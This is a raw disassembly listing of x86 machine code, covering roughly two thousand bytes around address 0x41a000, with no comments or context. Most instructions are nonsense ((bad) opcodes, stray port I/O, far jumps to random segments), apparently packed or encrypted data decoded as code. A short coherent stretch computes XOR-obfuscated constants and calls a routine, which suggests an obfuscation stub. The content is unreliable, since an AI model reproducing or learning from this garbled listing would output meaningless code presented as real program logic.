  41a2e1:	addr16 push 0x5e049c6a
  41a2e7:	jmp    0xe2a21fd
  41a2ec:	fs pop ecx
  41a2ee:	push   eax
  41a2ef:	and    DWORD PTR [esi+0x562b5ee2],esi
  41a2f5:	sbb    DWORD PTR [ebp-0x52],eax
  41a2f8:	mov    bh,BYTE PTR [esi+ebp*4-0x11]
  41a2fc:	fadd   QWORD PTR fs:[ebp+0x76ef993b]
  41a303:	mov    al,0x4
  41a305:	cmp    eax,0xf8594859
  41a30a:	test   al,0x5d
  41a30c:	fdiv   DWORD PTR [edx-0x65]
  41a30f:	fnstcw WORD PTR [ecx]
  41a311:	out    dx,al
  41a312:	ds pusha 
  41a314:	out    dx,eax
  41a315:	xchg   ecx,eax
  41a316:	ret    
  41a317:	test   DWORD PTR [edi+0x17],0xd967923
  41a31e:	push   ecx
  41a31f:	(bad)  
  41a320:	mov    al,ds:0xc95aba5f
  41a325:	push   cs
  41a326:	add    dh,ch
  41a328:	dec    edx
  41a329:	retf   
  41a32a:	xchg   esi,eax
  41a32b:	inc    ebp
  41a32c:	enter  0xae25,0x28
  41a330:	mov    ecx,0x815de94e
  41a335:	mov    BYTE PTR [ebx],bh
  41a337:	adc    edi,ebx
  41a339:	jb     0x41a341
  41a33b:	dec    ecx
  41a33c:	fadd   DWORD PTR [ebx]
  41a33e:	loop   0x41a2cd
  41a340:	add    BYTE PTR [ecx],bl
  41a342:	popa   
  41a343:	retf   
  41a344:	sub    ax,0x6e8
  41a348:	test   eax,0xe25c321f
  41a34d:	test   al,0xa3
  41a34f:	test   DWORD PTR [ebp+0x7be1f613],0x451b9bb3
  41a359:	mov    bl,0xf3
  41a35b:	ret    
  41a35c:	cmp    eax,DWORD PTR [eax+0x40]
  41a35f:	das    
  41a360:	dec    ecx
  41a361:	pop    ss
  41a362:	stos   DWORD PTR es:[edi],eax
  41a363:	or     cl,BYTE PTR [ebx]
  41a365:	add    BYTE PTR [edx+0x8],ah
  41a368:	ret    
  41a369:	push   es
  41a36a:	test   DWORD PTR [eax-0xcf3d1f3],ebp
  41a370:	xor    dl,BYTE PTR [edx-0x7b54946a]
  41a376:	in     al,dx
  41a377:	sbb    eax,0xd9d28f1f
  41a37c:	ins    DWORD PTR es:[edi],dx
  41a37d:	inc    ebp
  41a37e:	pop    edx
  41a37f:	cli    
  41a380:	int    0x3e
  41a382:	jne    0x41a39c
  41a384:	push   ss
  41a385:	neg    BYTE PTR [edi-0x5c]
  41a388:	jmp    0xfb17:0xbcb5ca11
  41a38f:	mov    cl,0x95
  41a391:	inc    edi
  41a392:	fmul   st,st(7)
  41a394:	sahf   
  41a395:	icebp  
  41a396:	dec    eax
  41a397:	test   DWORD PTR [edi-0x674ef7f8],ebp
  41a39d:	xchg   ch,ch
  41a39f:	sub    BYTE PTR [edi-0x55e774c8],0x23
  41a3a6:	cdq    
  41a3a7:	pushf  
  41a3a8:	loope  0x41a403
  41a3aa:	or     eax,0x87b8fa6f
  41a3af:	adc    BYTE PTR [esi],ch
  41a3b1:	sbb    DWORD PTR [esi+0x3d],ecx
  41a3b4:	cmp    al,0xcb
  41a3b6:	xchg   ebp,eax
  41a3b7:	test   eax,0xb497b2cc
  41a3bc:	inc    ebx
  41a3bd:	jns    0x41a352
  41a3bf:	pop    es
  41a3c0:	mov    BYTE PTR [edi],0x28
  41a3c3:	sub    edi,esi
  41a3c5:	repz dec edx
  41a3c7:	ror    DWORD PTR [eax-0x1affa816],0x12
  41a3ce:	jmp    0x4f43:0x36a2f531
  41a3d5:	je     0x41a3ea
  41a3d7:	loopne 0x41a3c3
  41a3d9:	mov    dh,0x78
  41a3db:	mov    ebx,DWORD PTR [ebp+0x6e21827c]
  41a3e1:	lods   eax,DWORD PTR ds:[esi]
  41a3e2:	mov    ecx,0xc41f4855
  41a3e7:	or     DWORD PTR [ebx+0x7c46c0b0],ebp
  41a3ed:	inc    esi
  41a3ee:	push   0xffffffd7
  41a3f0:	(bad)  
  41a3f1:	adc    ecx,DWORD PTR [esp]
  41a3f4:	iret   
  41a3f5:	retf   0xb413
  41a3f8:	fcom   st(6)
  41a3fa:	add    DWORD PTR [edx],esi
  41a3fc:	or     al,0xa6
  41a3fe:	repz gs cmp eax,0xec260a63
  41a405:	jns    0x41a401
  41a407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a408:	push   es
  41a409:	test   BYTE PTR [esi-0x71ffd49b],0xb4
  41a410:	sub    esi,ebx
  41a412:	jge    0x41a3dc
  41a414:	push   cs
  41a415:	loop   0x41a478
  41a417:	jne    0x41a44d
  41a419:	add    esp,DWORD PTR [edx+0x2a7e62c7]
  41a41f:	cmc    
  41a420:	adc    al,0xd7
  41a422:	pop    esp
  41a423:	repnz clc 
  41a425:	repz pop es
  41a427:	mov    bh,0xc5
  41a429:	fwait
  41a42a:	and    al,0x7
  41a42c:	mov    ds:0x5f914f01,eax
  41a431:	retf   
  41a432:	inc    edx
  41a433:	(bad)  
  41a434:	lahf   
  41a435:	aad    0x5b
  41a437:	cs lahf 
  41a439:	and    al,0xb
  41a43b:	mov    ebp,DWORD PTR [ecx+0x3339a80f]
  41a441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a442:	retf   
  41a443:	cmp    dl,BYTE PTR [edx-0x65a551aa]
  41a449:	add    edx,DWORD PTR [ecx]
  41a44b:	jo     0x41a40d
  41a44d:	push   ebx
  41a44e:	int    0xe4
  41a450:	not    ebx
  41a452:	shr    BYTE PTR [ecx],cl
  41a454:	shr    ebx,cl
  41a456:	push   ebx
  41a457:	clc    
  41a458:	cmp    eax,0xaacb52da
  41a45d:	adc    eax,0x264ea7b9
  41a462:	mov    al,ds:0xec9fb925
  41a467:	cdq    
  41a468:	push   ebx
  41a469:	xchg   edi,eax
  41a46a:	cdq    
  41a46b:	and    bl,BYTE PTR [ecx+0x5a97ecde]
  41a471:	leave  
  41a472:	dec    esp
  41a473:	push   edi
  41a474:	data16 loopne 0x41a462
  41a477:	push   ebp
  41a478:	adc    esi,DWORD PTR [eax+0x66341a97]
  41a47e:	in     al,0x78
  41a480:	scas   al,BYTE PTR es:[edi]
  41a481:	mov    ch,BYTE PTR [ebp-0x1f]
  41a484:	sbb    al,0x49
  41a486:	add    eax,0x2147aa11
  41a48b:	std    
  41a48c:	ret    
  41a48d:	retf   
  41a48e:	arpl   di,si
  41a490:	or     edx,DWORD PTR [ebx]
  41a492:	ins    DWORD PTR es:[edi],dx
  41a493:	add    DWORD PTR [esi+0x655b0af0],edi
  41a499:	jbe    0x41a455
  41a49b:	jecxz  0x41a421
  41a49d:	jl     0x41a4de
  41a49f:	or     eax,0xb811cf2c
  41a4a4:	leave  
  41a4a5:	ja     0x41a476
  41a4a7:	jl     0x41a462
  41a4a9:	or     edi,DWORD PTR [ebx]
  41a4ab:	sub    bl,BYTE PTR [eax-0x61]
  41a4ae:	cli    
  41a4af:	fst    st(4)
  41a4b1:	neg    ebp
  41a4b3:	jne    0x41a4d4
  41a4b5:	inc    edx
  41a4b6:	inc    ecx
  41a4b7:	jne    0x41a45e
  41a4b9:	xchg   ebp,eax
  41a4ba:	jecxz  0x41a4a3
  41a4bc:	int3   
  41a4bd:	pop    esp
  41a4be:	sti    
  41a4bf:	pop    esi
  41a4c0:	fs iret 
  41a4c2:	or     eax,0xb46ed6ff
  41a4c7:	mov    WORD PTR ds:0x1e48f1ca,gs
  41a4cd:	test   al,0x73
  41a4cf:	sahf   
  41a4d0:	sti    
  41a4d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4d2:	adc    esp,ebp
  41a4d4:	dec    edx
  41a4d5:	daa    
  41a4d6:	clc    
  41a4d7:	or     DWORD PTR [ebx],ebp
  41a4d9:	mov    ah,0x56
  41a4db:	dec    ecx
  41a4dc:	fadd   DWORD PTR ds:0x66ee07e6
  41a4e2:	lock sub al,0x36
  41a4e5:	and    al,0x11
  41a4e7:	shl    DWORD PTR [edi+0x2633fb0d],1
  41a4ed:	mov    dh,0x16
  41a4ef:	out    0x55,eax
  41a4f1:	in     eax,dx
  41a4f2:	sub    DWORD PTR [esi],edi
  41a4f4:	adc    ecx,DWORD PTR [esi-0x69]
  41a4f7:	push   0x29
  41a4f9:	xchg   ebx,eax
  41a4fa:	dec    ecx
  41a4fb:	sub    eax,0x6b05b24a
  41a500:	push   ebx
  41a501:	add    al,0x36
  41a503:	mov    al,ds:0x92fca67b
  41a508:	imul   esi,DWORD PTR [ebx+0x22],0x13
  41a50c:	mov    dl,0xe5
  41a50e:	out    dx,eax
  41a50f:	xor    DWORD PTR [ecx+0x39e80cb6],ebx
  41a515:	inc    eax
  41a516:	mov    ebx,0x2e6da039
  41a51b:	jle    0x41a51b
  41a51d:	in     al,dx
  41a51e:	sahf   
  41a51f:	add    ah,cl
  41a521:	jl     0x41a517
  41a523:	cmc    
  41a524:	aam    0x68
  41a526:	out    0x7e,al
  41a528:	mov    es:0x495a3e60,eax
  41a52e:	sbb    eax,0xd97cbdd8
  41a533:	pop    ss
  41a534:	(bad)  
  41a535:	sbb    BYTE PTR [edi-0x40c22663],al
  41a53b:	jnp    0x41a591
  41a53d:	xor    BYTE PTR [edi-0x1b],0x6b
  41a541:	enter  0xdc63,0x8c
  41a545:	fcomp  DWORD PTR [edx+0x6]
  41a548:	xor    eax,0x65991209
  41a54d:	push   edx
  41a54e:	pop    es
  41a54f:	clc    
  41a550:	xchg   edi,eax
  41a551:	(bad)  
  41a552:	fstp   DWORD PTR [edx+eiz*4]
  41a555:	pop    ds
  41a556:	stos   BYTE PTR es:[edi],al
  41a557:	std    
  41a558:	popf   
  41a559:	out    dx,eax
  41a55a:	xor    al,0xe4
  41a55c:	repz mov ds:0xb20405f8,al
  41a562:	scas   al,BYTE PTR es:[edi]
  41a563:	sub    al,0x2c
  41a565:	xor    al,0x5d
  41a567:	push   ss
  41a568:	ret    
  41a569:	push   ebp
  41a56a:	xlat   BYTE PTR ds:[ebx]
  41a56b:	xor    eax,0xdd1411aa
  41a570:	nop
  41a571:	mov    cl,BYTE PTR [edx]
  41a573:	inc    ebx
  41a574:	cwde   
  41a575:	call   0x9f8a23ae
  41a57a:	adc    esi,edi
  41a57c:	pop    esi
  41a57d:	mov    ds:0x9f18dd39,eax
  41a582:	jle    0x41a5ae
  41a584:	sbb    BYTE PTR [ecx],bh
  41a586:	xor    BYTE PTR [ecx],cl
  41a588:	cmp    edi,DWORD PTR [edi-0x22]
  41a58b:	mov    ds:0x1fdeed28,eax
  41a590:	fistp  DWORD PTR [eax+0x53f22e9d]
  41a596:	les    edi,FWORD PTR [ebp+0x43]
  41a599:	outs   dx,DWORD PTR ds:[esi]
  41a59a:	mov    dl,0xff
  41a59c:	xor    eax,0xbf15b44d
  41a5a1:	in     al,dx
  41a5a2:	pop    esi
  41a5a3:	lock das 
  41a5a5:	int    0xd2
  41a5a7:	dec    edi
  41a5a8:	sub    eax,0x9c509828
  41a5ad:	sbb    eax,0xffcd7caf
  41a5b2:	loop   0x41a573
  41a5b4:	xchg   BYTE PTR [esi-0x57e67be9],cl
  41a5ba:	sub    dh,BYTE PTR [edi]
  41a5bc:	pop    eax
  41a5bd:	lea    eax,[ecx+0xc1efdcb]
  41a5c3:	inc    ebp
  41a5c4:	mov    edi,0xc1ed4d5a
  41a5c9:	cs cmp eax,0x7dd34a4
  41a5cf:	(bad)  
  41a5d0:	pop    ebp
  41a5d1:	dec    ebx
  41a5d2:	adc    al,0x7d
  41a5d4:	mov    ds:0x969c1ce,eax
  41a5d9:	sti    
  41a5da:	outs   dx,DWORD PTR ds:[esi]
  41a5db:	call   0x8ee0:0xe9c40800
  41a5e2:	wbinvd 
  41a5e4:	xchg   DWORD PTR [eax-0x72b9463d],ecx
  41a5ea:	repnz test al,0x8
  41a5ed:	(bad)  
  41a5ee:	nop    DWORD PTR [edx]
  41a5f1:	lods   al,BYTE PTR ds:[esi]
  41a5f2:	fild   DWORD PTR [ebx-0x631d02f7]
  41a5f8:	loop   0x41a650
  41a5fa:	cmp    al,BYTE PTR [eax+ecx*4+0x7f27aa65]
  41a601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a602:	lods   al,BYTE PTR ds:[si]
  41a604:	mov    edx,0x60a4cbae
  41a609:	push   es
  41a60a:	loope  0x41a5c3
  41a60c:	ret    0x11b8
  41a60f:	or     DWORD PTR [eax],esi
  41a611:	add    DWORD PTR [edx],ebp
  41a613:	outs   dx,BYTE PTR ds:[esi]
  41a614:	leave  
  41a615:	sahf   
  41a616:	push   edx
  41a617:	cli    
  41a618:	dec    ecx
  41a619:	sub    BYTE PTR [ecx-0x2dedad3c],ch
  41a61f:	out    dx,eax
  41a620:	sbb    DWORD PTR [edx+0x7c],esp
  41a623:	push   0x59
  41a625:	sub    BYTE PTR [ebx-0xb8dda8e],cl
  41a62b:	xor    BYTE PTR ds:0xbe048fd0,ch
  41a631:	add    eax,0xf9bad7cf
  41a636:	xlat   BYTE PTR ds:[ebx]
  41a637:	(bad)  
  41a639:	inc    ebx
  41a63a:	push   ecx
  41a63b:	xchg   esp,eax
  41a63c:	nop
  41a63d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a63e:	xor    DWORD PTR es:[esi-0x11],ecx
  41a642:	fwait
  41a643:	sahf   
  41a644:	push   ss
  41a645:	sub    DWORD PTR [ecx+0x73],0x61daf3f
  41a64c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a64d:	loopne 0x41a643
  41a64f:	xor    esi,ebp
  41a651:	xor    BYTE PTR [ebp-0x42],bh
  41a654:	fwait
  41a655:	adc    bl,bl
  41a657:	xchg   ecx,eax
  41a658:	ja     0x41a652
  41a65a:	pusha  
  41a65b:	mov    esp,DWORD PTR [ebx+ecx*4+0x2b]
  41a65f:	ror    DWORD PTR [ebx+0x1b50244c],0xd3
  41a666:	mov    ebx,DWORD PTR [esp+0x54]
  41a66a:	cmp    ecx,eax
  41a66c:	jne    0x41a67a
  41a672:	cmp    ebx,edx
  41a674:	je     0x41d921
  41a67a:	mov    DWORD PTR [esp+0x30],0x71ba
  41a682:	mov    DWORD PTR [esp+0x34],0x5f78
  41a68a:	mov    DWORD PTR [esp+0x10],0x7b9c
  41a692:	mov    DWORD PTR [esp+0x14],0x5622
  41a69a:	mov    eax,DWORD PTR [esp+0x10]
  41a69e:	mov    ecx,DWORD PTR [esp+0x14]
  41a6a2:	mov    edx,DWORD PTR [esp+0x30]
  41a6a6:	mov    ebx,DWORD PTR [esp+0x34]
  41a6aa:	add    eax,0x3646
  41a6af:	adc    ecx,0x7ace
  41a6b5:	xor    eax,0x3e2e
  41a6ba:	xor    ecx,0x4b71
  41a6c0:	and    eax,edx
  41a6c2:	mov    DWORD PTR [esp+0x88],eax
  41a6c9:	and    ecx,ebx
  41a6cb:	mov    DWORD PTR [esp+0x8c],ecx
  41a6d2:	mov    DWORD PTR [esp+0x50],0x18d6
  41a6da:	mov    DWORD PTR [esp+0x54],0x2bb4
  41a6e2:	mov    DWORD PTR [esp+0x48],0x14
  41a6ea:	mov    DWORD PTR [esp+0x4c],0x0
  41a6f2:	mov    DWORD PTR [esp+0x30],0x1
  41a6fa:	mov    DWORD PTR [esp+0x34],0x0
  41a702:	mov    DWORD PTR [esp+0x10],0xa87
  41a70a:	mov    DWORD PTR [esp+0x14],0x7fd9
  41a712:	mov    eax,DWORD PTR [esp+0x10]
  41a716:	mov    ecx,DWORD PTR [esp+0x14]
  41a71a:	push   0x2
  41a71c:	push   0x7f349462
  41a721:	xor    ecx,0x3601
  41a727:	xor    eax,0x5491
  41a72c:	push   ecx
  41a72d:	push   eax
  41a72e:	call   0x42206f
  41a733:	mov    ecx,DWORD PTR [esp+0x30]
  41a737:	jmp    0x41ab06
  41a73c:	cmp    ebx,DWORD PTR [edi-0x7b]
  41a73f:	arpl   WORD PTR ds:0xe91f1b5b,sp
  41a745:	add    cl,BYTE PTR [ebx+0x7e]
  41a748:	add    al,0x5a
  41a74a:	dec    ecx
  41a74b:	push   0xffffffcf
  41a74d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a74e:	push   ss
  41a74f:	sbb    BYTE PTR [edx+edx*1+0x540f1818],bh
  41a756:	into   
  41a757:	es nop
  41a759:	jmp    0x7799c908
  41a75e:	pop    edx
  41a75f:	rcr    DWORD PTR [edi],1
  41a761:	in     eax,dx
  41a762:	pop    es
  41a763:	jbe    0x41a7ac
  41a765:	xor    al,0x87
  41a767:	cmp    cl,BYTE PTR [ecx+0x5312ead7]
  41a76d:	bound  edx,QWORD PTR [ecx-0x26]
  41a770:	sub    ebx,DWORD PTR [ebx+0xcd7cd]
  41a776:	fistp  WORD PTR [edi+edx*1-0x55]
  41a77a:	mov    bl,0x72
  41a77c:	push   es
  41a77d:	aaa    
  41a77e:	out    0x4c,eax
  41a780:	(bad)  [eax]
  41a782:	cwde   
  41a783:	retf   
  41a784:	mov    bl,ah
  41a786:	sbb    al,0xa3
  41a788:	mov    edx,0xc6abb723
  41a78d:	dec    edi
  41a78e:	inc    eax
  41a78f:	sub    dl,al
  41a791:	pop    edx
  41a792:	ja     0x41a717
  41a794:	cwde   
  41a795:	push   es
  41a796:	fisttp QWORD PTR [ebx]
  41a798:	sub    al,0x3e
  41a79a:	inc    ebx
  41a79b:	sbb    esp,DWORD PTR [ebp-0x17]
  41a79e:	int3   
  41a79f:	adc    BYTE PTR [edi-0x71],al
  41a7a2:	leave  
  41a7a3:	lods   al,BYTE PTR ds:[esi]
  41a7a4:	das    
  41a7a5:	inc    edx
  41a7a6:	add    cl,BYTE PTR [ebp-0x58]
  41a7a9:	push   ds
  41a7aa:	push   eax
  41a7ab:	inc    edi
  41a7ac:	mov    dl,0xdc
  41a7ae:	lods   eax,DWORD PTR ds:[esi]
  41a7af:	jnp    0x41a801
  41a7b1:	or     ah,BYTE PTR [eax-0x52]
  41a7b4:	xchg   DWORD PTR [ebx],edi
  41a7b6:	fpatan 
  41a7b8:	mov    bl,0x18
  41a7ba:	fst    st(6)
  41a7bc:	xchg   ecx,eax
  41a7bd:	add    ecx,DWORD PTR [ecx+eax*8]
  41a7c0:	push   ecx
  41a7c1:	jp     0x41a827
  41a7c3:	call   0x44ee:0x2b862a4b
  41a7ca:	lahf   
  41a7cb:	xor    eax,0xa20398a2
  41a7d0:	pop    ds
  41a7d1:	mov    eax,0x18908e61
  41a7d6:	pop    ecx
  41a7d7:	rcr    DWORD PTR [edi+0x48],0x10
  41a7db:	jmp    0x71d7:0xc83aa29b
  41a7e2:	imul   esp,DWORD PTR [ecx],0xffffffd5
  41a7e5:	push   ebx
  41a7e6:	jns    0x41a7da
  41a7e8:	inc    ecx
  41a7e9:	ss ret 
  41a7eb:	mov    dh,0x83
  41a7ed:	jb     0x41a7b3
  41a7ef:	cdq    
  41a7f0:	mov    WORD PTR [edi-0x40877221],?
  41a7f6:	in     al,dx
  41a7f7:	fisub  WORD PTR [esi+0x1f25ac0f]
  41a7fd:	cmp    eax,0x3cd8813c
  41a802:	bound  esi,QWORD PTR [ebx]
  41a804:	or     eax,0xa9c548aa
  41a809:	stos   DWORD PTR es:[edi],eax
  41a80a:	aas    
  41a80b:	jecxz  0x41a80a
  41a80d:	and    al,0x7d
  41a80f:	(bad)  
  41a810:	out    dx,eax
  41a811:	rcl    ebp,1
  41a813:	int    0x36
  41a815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a816:	(bad)  
  41a818:	mov    ebp,0xa80bb3ca
  41a81d:	popa   
  41a81e:	mov    esi,DWORD PTR [ebx+0x2b870ae9]
  41a824:	call   0x3823:0x6cf71539
  41a82b:	das    
  41a82c:	test   eax,0x93030e9a
  41a831:	fisub  DWORD PTR [ecx-0x19c6c5c7]
  41a837:	rcl    BYTE PTR [edi],0x77
  41a83a:	cmp    BYTE PTR [edx+ebp*1],0x58
  41a83e:	mov    ebp,0xd2800fc0
  41a843:	fsubr  DWORD PTR [esi]
  41a845:	push   edx
  41a846:	arpl   WORD PTR [ebx-0x15],di
  41a849:	push   edx
  41a84a:	sbb    eax,ecx
  41a84c:	and    DWORD PTR [edx+0x2901bdf3],edi
  41a852:	dec    ebp
  41a853:	cs aaa 
  41a855:	int3   
  41a856:	aaa    
  41a857:	add    dl,dl
  41a859:	ds repnz dec ecx
  41a85c:	shl    DWORD PTR [edx-0x48],0x19
  41a860:	fsubr  QWORD PTR [esp+edx*1+0x22cd7a9c]
  41a867:	push   bp
  41a869:	sbb    dl,0x95
  41a86c:	add    edx,DWORD PTR [esi-0x5f]
  41a86f:	mov    ch,BYTE PTR [esi]
  41a871:	or     edx,DWORD PTR [ecx+0x3f]
  41a874:	inc    edi
  41a875:	pop    es
  41a876:	scas   eax,DWORD PTR es:[edi]
  41a877:	jl     0x41a8bc
  41a879:	pop    esp
  41a87a:	retf   
  41a87b:	daa    
  41a87c:	jg     0x41a8fa
  41a87e:	fdiv   st(3),st
  41a880:	cmp    BYTE PTR [eax+0x5f63fd58],bl
  41a886:	push   edx
  41a887:	call   0x43c9:0x1c559829
  41a88e:	or     BYTE PTR [ecx+ebx*8+0x62],0x75
  41a893:	push   ss
  41a894:	pop    esp
  41a895:	adc    BYTE PTR [ebx+0x53ae58f5],ch
  41a89b:	mov    ds:0x3c54bf6e,al
  41a8a0:	clc    
  41a8a1:	mov    edi,0x506d8d02
  41a8a6:	mov    cl,BYTE PTR [ebx+0x1823cbed]
  41a8ac:	adc    BYTE PTR ds:0xee95001c,al
  41a8b2:	cmp    eax,0xdf0baf7
  41a8b7:	push   esi
  41a8b8:	inc    ebx
  41a8b9:	jno    0x41a937
  41a8bb:	in     al,dx
  41a8bc:	out    0x36,al
  41a8be:	sti    
  41a8bf:	aad    0xc9
  41a8c1:	out    0xef,eax
  41a8c3:	push   ss
  41a8c4:	lods   eax,DWORD PTR ds:[esi]
  41a8c5:	jge    0x41a946
  41a8c7:	test   al,0xb9
  41a8c9:	pop    edx
  41a8ca:	mov    ah,0xcc
  41a8cc:	sti    
  41a8cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8ce:	retf   0x2bb1
  41a8d1:	(bad)  
  41a8d2:	xor    cl,BYTE PTR [edx+ebp*1+0x26d906b2]
  41a8d9:	cmp    DWORD PTR [ebx],esi
  41a8db:	jle    0x41a8ed
  41a8dd:	jno    0x41a8d3
  41a8df:	and    eax,0xb3d822f0
  41a8e4:	inc    edx
  41a8e5:	xchg   ebx,eax
  41a8e6:	addr16 (bad) 
  41a8e8:	test   al,0xe4
  41a8ea:	ins    BYTE PTR es:[edi],dx
  41a8eb:	add    DWORD PTR [esi],edx
  41a8ed:	hlt    
  41a8ee:	adc    esi,DWORD PTR [edi+0x4b]
  41a8f1:	jmp    0x1ecd66f
  41a8f6:	or     ebx,DWORD PTR [edi]
  41a8f8:	and    ch,BYTE PTR [esi]
  41a8fa:	(bad)  [ecx]
  41a8fc:	lock pop ds
  41a8fe:	cli    
  41a8ff:	xchg   edi,eax
  41a900:	sbb    al,0x74
  41a902:	retf   0x3ce
  41a905:	ret    
  41a906:	mov    ebp,DWORD PTR [eax-0x1e]
  41a909:	jecxz  0x41a896
  41a90b:	neg    bl
  41a90d:	pop    es
  41a90e:	iret   
  41a90f:	daa    
  41a910:	pop    ss
  41a911:	inc    edx
  41a912:	jg     0x41a98b
  41a914:	jmp    0x86c5:0x966e9518
  41a91b:	pushf  
  41a91c:	add    esp,DWORD PTR [ebx+0x1b3268e7]
  41a922:	adc    DWORD PTR [eax+0x3625d4cd],edi
  41a928:	dec    ebx
  41a929:	nop
  41a92a:	les    ecx,FWORD PTR [edi]
  41a92c:	stos   BYTE PTR es:[edi],al
  41a92d:	outs   dx,BYTE PTR ds:[esi]
  41a92e:	jecxz  0x41a8be
  41a930:	inc    eax
  41a931:	mov    cl,0xf5
  41a933:	add    ebp,DWORD PTR [ecx-0x5e9007e8]
  41a939:	stos   DWORD PTR es:[edi],eax
  41a93a:	xor    al,0x73
  41a93c:	outs   dx,DWORD PTR ds:[esi]
  41a93d:	push   ecx
  41a93e:	add    al,0x30
  41a940:	jge    0x41a95e
  41a942:	push   ss
  41a943:	(bad)  
  41a944:	dec    ebp
  41a945:	push   edx
  41a946:	pop    edx
  41a947:	jl     0x41a92b
  41a949:	pop    ebp
  41a94a:	add    ch,BYTE PTR [edi-0x72]
  41a94d:	sub    edi,DWORD PTR [ebx+0x2b]
  41a950:	mov    BYTE PTR ds:0xab3939f7,ch
  41a956:	inc    esi
  41a957:	and    eax,0x166f171a
  41a95c:	sub    dh,cl
  41a95e:	pushf  
  41a95f:	out    dx,eax
  41a960:	pop    es
  41a961:	or     DWORD PTR [ecx+esi*8],esi
  41a964:	add    dh,BYTE PTR [ecx-0xc]
  41a967:	mov    ch,0xf0
  41a969:	loope  0x41a94e
  41a96b:	push   edx
  41a96c:	dec    edi
  41a96d:	push   es
  41a96e:	out    dx,al
  41a96f:	push   0x7fb3703b
  41a974:	push   es
  41a975:	ins    BYTE PTR es:[edi],dx
  41a976:	push   edi
  41a977:	inc    esp
  41a978:	pop    es
  41a979:	push   esp
  41a97a:	xor    ch,BYTE PTR [edi]
  41a97c:	das    
  41a97d:	movaps XMMWORD PTR [edi+0x29],xmm7
  41a981:	fwait
  41a982:	and    BYTE PTR [ebx+0x13eb6522],al
  41a988:	xchg   esi,eax
  41a98a:	sbb    ecx,DWORD PTR fs:[ebx-0x60]
  41a98e:	push   0x9e4a685c
  41a993:	fdivr  DWORD PTR [ecx]
  41a995:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a996:	daa    
  41a997:	mov    DWORD PTR [ecx+edi*1-0x6fe3b983],ebp
  41a99e:	clc    
  41a99f:	loope  0x41a9b9
  41a9a1:	(bad)  
  41a9a2:	aad    0x34
  41a9a4:	jp     0x41a992
  41a9a6:	jmp    0x41a951
  41a9a8:	jp     0x41a9f4
  41a9aa:	dec    ebp
  41a9ab:	mov    ch,0x47
  41a9ad:	cwde   
  41a9ae:	retf   
  41a9af:	pop    ss
  41a9b0:	xor    BYTE PTR [eax],ah
  41a9b2:	adc    ch,bl
  41a9b4:	sbb    DWORD PTR [eax+0x4fd82298],ebx
  41a9ba:	mov    cl,0x1e
  41a9bc:	mov    cs,edi
  41a9be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9bf:	(bad)  
  41a9c0:	pop    esp
  41a9c1:	xchg   edi,eax
  41a9c2:	lea    ecx,[ebx]
  41a9c4:	fist   DWORD PTR [esi+ebx*1]
  41a9c7:	stos   BYTE PTR es:[edi],al
  41a9c8:	mov    al,0x9b
  41a9ca:	gs push 0x228ab8e
  41a9d0:	pop    esp
  41a9d1:	imul   esp,DWORD PTR [edx+0x2e],0xffffffb7
  41a9d5:	ret    0xe578
  41a9d8:	es dec eax
  41a9da:	sbb    BYTE PTR [eax-0x16],ah
  41a9dd:	cs jecxz 0x41aa54
  41a9e0:	inc    edi
  41a9e1:	int3   
  41a9e2:	sbb    ebx,ebx
  41a9e4:	gs inc esp
  41a9e6:	and    DWORD PTR [ecx-0xa68552a],esi
  41a9ec:	sti    
  41a9ed:	das    
  41a9ee:	xor    DWORD PTR [ecx+0x79],edx
  41a9f1:	ins    DWORD PTR es:[edi],dx
  41a9f2:	push   eax
  41a9f3:	icebp  
  41a9f4:	cmp    DWORD PTR [edx+0x6ee73e4d],eax
  41a9fa:	xchg   ebp,eax
  41a9fb:	mov    cl,0x72
  41a9fd:	jle    0x41aa2c
  41a9ff:	or     eax,DWORD PTR [eax+0x529b0217]
  41aa05:	int3   
  41aa06:	and    al,0xbe
  41aa08:	sub    esi,edx
  41aa0a:	jbe    0x41a98d
  41aa0c:	jo     0x41a99f
  41aa0e:	jl     0x41a9f0
  41aa10:	and    ebp,DWORD PTR [edi]
  41aa12:	sbb    ebx,DWORD PTR ds:0xd373eb38
  41aa18:	fwait
  41aa19:	retf   
  41aa1a:	and    ch,BYTE PTR [edi]
  41aa1c:	mov    al,0xe5
  41aa1e:	loop   0x41aa9e
  41aa20:	xor    al,0xee
  41aa22:	jnp    0x41a9d8
  41aa24:	push   es
  41aa25:	xor    ebp,DWORD PTR ds:0xe8cab752
  41aa2b:	xor    al,0x47
  41aa2d:	jo     0x41aa13
  41aa2f:	ss (bad) 
  41aa31:	mov    ebp,0xa3d0b6d8
  41aa36:	shl    DWORD PTR [ebx],1
  41aa38:	xchg   esp,eax
  41aa39:	pop    ebx
  41aa3a:	ins    BYTE PTR es:[edi],dx
  41aa3b:	push   edx
  41aa3c:	xor    BYTE PTR [eax+0x3b6d85f5],bl
  41aa42:	push   ebx
  41aa43:	mov    ah,0x2a
  41aa45:	xchg   esp,eax
  41aa46:	in     al,dx
  41aa47:	loope  0x41aa63
  41aa49:	inc    esp
  41aa4a:	xchg   edi,eax
  41aa4b:	xchg   esi,eax
  41aa4c:	clc    
  41aa4d:	ret    0xd7f5
  41aa50:	mov    DWORD PTR [esi-0xd23be4a],esp
  41aa56:	std    
  41aa57:	cmp    cl,BYTE PTR [ebp+0x1f9ac964]
  41aa5d:	push   ecx
  41aa5e:	jne    0x41a9ed
  41aa60:	daa    
  41aa61:	pusha  
  41aa62:	xor    ebx,DWORD PTR [edi]
  41aa64:	xor    ebx,DWORD PTR [ecx]
  41aa66:	sbb    DWORD PTR [esi],ecx
  41aa68:	in     eax,dx
  41aa69:	push   cs
  41aa6a:	pop    eax
  41aa6b:	imul   edx,DWORD PTR [ebp+0x33e2ffb0],0xffffff82
  41aa72:	cmp    cl,BYTE PTR [edx]
  41aa74:	mov    ebx,0x7e394669
  41aa79:	jno    0x41aa27
  41aa7b:	and    BYTE PTR [edi],dl
  41aa7d:	daa    
